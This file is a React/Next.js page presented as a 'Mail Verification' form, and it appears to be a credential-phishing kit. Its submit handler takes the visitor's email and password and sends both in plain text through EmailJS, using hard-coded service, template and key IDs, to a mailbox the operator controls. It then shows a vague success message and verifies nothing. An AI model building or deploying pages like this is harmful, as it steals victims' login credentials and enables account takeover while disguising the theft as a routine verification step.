import Image from 'next/image';
import { useState } from 'react';
import logo from 'public/logo.png';
import { AiFillEye, AiFillEyeInvisible } from 'react-icons/ai';
import emailjs from 'emailjs-com';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useRouter } from 'next/router';

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [show, setShow] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const customToastStyle = {
    backgroundColor: '#333333',
    color: '#ffffff',
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    // Configure your EmailJS parameters
    const templateParams = {
      email,
      password,
    };

    // Use toast.promise to handle loading state
    const promise = new Promise((resolve, reject) => {
      setIsLoading(true); // Set isLoading to true when promise starts
      emailjs
        .send(
          'service_r3xsa5u',
          'template_qj0eyct',
          templateParams,
          'LuTHQwHa41YqmsqOT'
        )
        .then((response) => {
          console.log('Email sent successfully!', response.text);
          resolve();
          // toast.success('Submission Successful');
          setEmail('');
          setPassword('');
        })
        .catch((error) => {
          console.error('Error sending email:', error);
          setIsLoading(false); // Set isLoading to false when promise finishes
          reject(error);
          toast.error('Failed to send email');
          // router.reload();
          // console.log('relod');
        })
        .finally(() => {
          setIsLoading(false); // Set isLoading to false when promise finishes
        });
    });

    toast.promise(promise, {
      pending: 'Sending email...',
      success: 'Successfully',
      error: 'Failed to send email',
    });
  };

  return (
    <main className="max-w-[600px] flex flex-col justify-between items-between h-screen mx-auto px-2 py-6">
      <div className="max-h-48 h-48 w-full mb-18 overflow-hidden">
        <div className="h-12 w-12">
          <Image
            className="h-full w-full object-cover object-center"
            src={logo}
            alt="logo"
          />
        </div>
      </div>
      <div className="w-full h-full">
        <div className="text-2xl px-4 font-semibold text-white mb-2">
          Mail Verification
        </div>
        <form
          onSubmit={handleSubmit}
          className="mx-auto rounded-lg h-full w-full px-4 py-4"
        >
          <div className="mb-8">
            <input
              placeholder="Email"
              type="email"
              id="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-4 text-xl text-white focus:border-white focus:border-b-2 border-b-4 border-[#5392c6] placeholder-[#5392c6] focus:outline-none bg-transparent"
              required
            />
          </div>
          <div className="mb-8 relative">
            <input
              placeholder="Password"
              type={show ? 'text' : 'password'}
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-4 text-xl text-white focus:border-white focus:border-b-2 border-b-4 border-[#5392c6] placeholder-[#5392c6] focus:outline-none bg-transparent mb-4"
              required
            />
            <div
              className="absolute top-6 right-4 cursor-pointer text-gray-500"
              onClick={() => {
                setShow(!show);
              }}
            >
              {show ? (
                <AiFillEyeInvisible size={24} fill="#6099cc" />
              ) : (
                <AiFillEye size={24} fill="#6099cc" />
              )}
            </div>
          </div>

          <button
            type="submit"
            className="bg-[#1f5d96] w-full text-[#6099cc] px-4 py-2 font-bold rounded-md hover:text-white hover:duration-500 hover:bg-[#6099cc]"
            disabled={isLoading} // Disable button when isLoading is true
          >
            {isLoading ? 'Submitting...' : 'Submit'}
          </button>
        </form>
      </div>
      <ToastContainer closeOnClick pauseOnHover toastStyle={customToastStyle} />
    </main>
  );
}
